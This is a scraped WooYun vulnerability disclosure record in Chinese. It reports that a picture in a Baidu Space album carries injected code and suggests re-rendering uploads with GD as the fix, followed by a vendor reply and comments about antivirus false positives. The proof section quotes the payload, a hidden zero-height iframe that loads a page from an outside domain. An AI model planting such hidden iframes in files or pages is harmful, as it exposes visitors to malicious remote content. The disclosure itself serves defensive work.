{"id": 23876, "wybug_id": "wooyun-2010-0716", "wybug_title": "百度空间上传图片中包含恶意代码", "wybug_corp": "百度", "wybug_author": "路人甲", "wybug_date": "2010-10-20 12:01", "wybug_open_date": "2010-11-19 15:00", "wybug_type": "xss跨站脚本攻击", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["图片内容未检测导致跨站脚本漏洞", "业务风险"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2010-10-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2010-10-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2010-10-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2010-11-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2010-11-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2010-11-19：\t细节向公众公开  简要描述： 百度空间某相册中，上传的图片中，图片被加入恶意代码，某些浏览器解析图片时候，可能会把恶意代码解析，对客户端产生威胁。 详细说明：  图片位置：http://hiphotos.baidu.com/ruyanshihe/pic/item/a0119cecc26a407179f0555c.jpg被加入代码：<iframe src=\"http://w.mh8888.cn/ad.htm?a\" width=\"100\" height=\"0\"></iframe>chrome浏览时，在图片正常解析的情况下，代码虽然未被执行，但杀毒软件报告了。IE6下估计会被解析。未测试。当浏览者是小白的时候，这种提示，会让小白害怕，对百度的“名声”产生影响。   漏洞证明：  \n<iframe src=\"http://w.mh8888.cn/ad.htm?a\" width=\"100\" height=\"0\"></iframe>\n\n\n   修复方案：  前段时间，80sec爆了nginx webserver下php.ini参数不当，导致nginx解析漏洞。但这件归根结底是隐患出现在哪里？php参数配置不当？我觉得不是。我觉得问题的主要原因是上传的“图片”不合格，假如包含恶意代码的文件根本不会被保存到服务器上，那么这种问题就不会发生。个人认为，对上传的文件（图片）严格控制，最好用GD重绘图片，使得伪装成正常图片，且包含恶意代码的文件，不包含恶意代码，成为正常的图片。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2010-10-20 15:09 厂商回复： 感谢提交 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2011-09-22 12:40 |    \t\trayh4c \t\t\t( 普通白帽子  |\t\t\t        Rank:240 漏洞数:23        )\t\t \n  说实话这也反应出杀毒软件的问题，他们只粗解HTTP包，匹到IFRAME的静态规则就暴毒，没有考虑过看看文件头是不是真的图片不会被浏览器解析成HTML，当然这样涉及到杀毒软件的效率问题，误报和效率两者都要考虑。    \n     2011-09-22 12:46 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  是杀毒软件2b吧 向360看齐！    \n     2011-09-22 12:50 |    \t\trayh4c \t\t\t( 普通白帽子  |\t\t\t        Rank:240 漏洞数:23        )\t\t \n  - - , 打上逗号吧，看得我惊心动魄~    \n     2011-11-14 11:27 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  avast 的问题？svast的误报率的确很高。    \n     2012-01-24 09:37 |    \t\tknife \t\t\t( 普通白帽子  |\t\t\t        Rank:155 漏洞数:24        | 抬枪上御女，提臀迎众基。)\t\t \n  向360看齐    \n     2012-06-05 09:58 |    \t\t寒剑 \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:5        | 一片空白，白的可怕)\t\t \n  应该是在图片里插入了一句话木马后上传的    \n     2012-11-18 17:15 |    \t\tzhq445078388 \t\t\t( 实习白帽子  |\t\t\t        Rank:60 漏洞数:19        | 请牢记\"杀进程点康姆\")\t\t \n  存在风险么? 这个纯粹是流量扫描的弊端而已..,不然 难道你让他回去扫下文件头? 卡死你.    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}